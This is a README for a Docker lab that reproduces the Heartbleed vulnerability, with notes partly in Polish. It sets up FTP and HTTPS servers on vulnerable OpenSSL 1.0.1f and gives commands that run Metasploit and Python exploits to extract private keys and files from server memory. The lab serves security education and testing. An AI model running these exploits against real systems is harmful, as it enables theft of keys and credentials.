Design
=====

Docker images:

1. proftpd-bleed - stawia serwer proftpd (przykladowy user: testuser/bordodeszato2009)
 korzystajacy z openssl 1.0.1f
2. ftp-bystander - co chwile loguje sie na proftpd-bleed i uploaduje plik credentials.php z danymi do bazy danych i kluczem do API platnosci24
3. nginx-bleed - stawia serwer nginx korzystający z openssl 1.0.1f, ktory umożliwia ściagniecie pliku confidential.txt zalogowanemu userowi (przykladowy user: testuser/bordodes)
4. http-bystander - co chwile loguje sie na nginx-bleed i sciaga confidential.txt
5. metasploit - uzywajac metasploita wyciaga privkey serwera
6. exploit - uzywajac naszego exploita w Pythonie stara sie znalezc w dumpie plik PHP lub string "CONFIDENTIAL"

Repo + docker hub
====

https://github.com/kacperzuk/heartbleed

FIXME: dockerhub, jak juz bedzie

Usage
======

Run vulnerable FTP server
```
docker run -p 2121:21 -p 30000-30009:30000-30009 -it --rm --name=proftpd-bleed kacperzuk/heartbleed-testbed-proftpd-bleed
```

Test connection:
```
$ openssl s_client -connect localhost:2121 -starttls ftp
$ curl -k --ftp-ssl ftp://localhost:2121/ --user testuser:bordodeszato2009
$ curl -vk --ftp-ssl ftp://localhost:2121/ --user testuser:bordodeszato2009
```

Run a fake-user that uploads credentials.php to server few times a second:
```
docker run --link proftpd-bleed:ftpd -it --rm --name=ftp-bystander kacperzuk/heartbleed-testbed-ftp-bystander
```

Run exploit from metasploit (it extracts private key and dumps it into /tmp/msf4/loot):
```
docker run --link proftpd-bleed:ftpd --rm -it -v /tmp/msf4:/root/.msf4 kacperzuk/heartbleed-testbed-metasploit /usr/local/bin/init.sh ftp-hb.rc
```

Run authtls-heartbleed.py exploit (it tries to extract PHP file, but won't succeed ever because proftpd is forking):
```
docker run --link proftpd-bleed:ftpd --rm -it kacperzuk/heartbleed-testbed-exploit python3 authtls-heartbleed.py ftpd 21
```

You can stop all containers.

Run vulnerable HTTPS server
```
docker run -p 4443:443 -it --rm --name=nginx-bleed kacperzuk/heartbleed-testbed-nginx-bleed
```

Test connection:
```
$ openssl s_client -connect localhost:4443
$ curl -k https://localhost:4443/confidential.txt --user testuser:bordodes
$ curl -vk https://localhost:4443/confidential.txt --user testuser:bordodes
```

Run a fake-user that uploads credentials.php to server few times a second:
```
docker run --link nginx-bleed:httpd -it --rm --name=http-bystander kacperzuk/heartbleed-testbed-http-bystander
```

Run exploit from metasploit (it extracts private key):
```
docker run --link nginx-bleed:httpd --rm -it -v /tmp/msf4:/root/.msf4 kacperzuk/heartbleed-testbed-metasploit /usr/local/bin/init.sh http-hb.rc
```

Run https-heartbleed.py exploit (nginx isn't forking, so it should find the confidential file):
```
docker run --link nginx-bleed:httpd --rm -it kacperzuk/heartbleed-testbed-exploit python3 https-heartbleed.py httpd 443
```
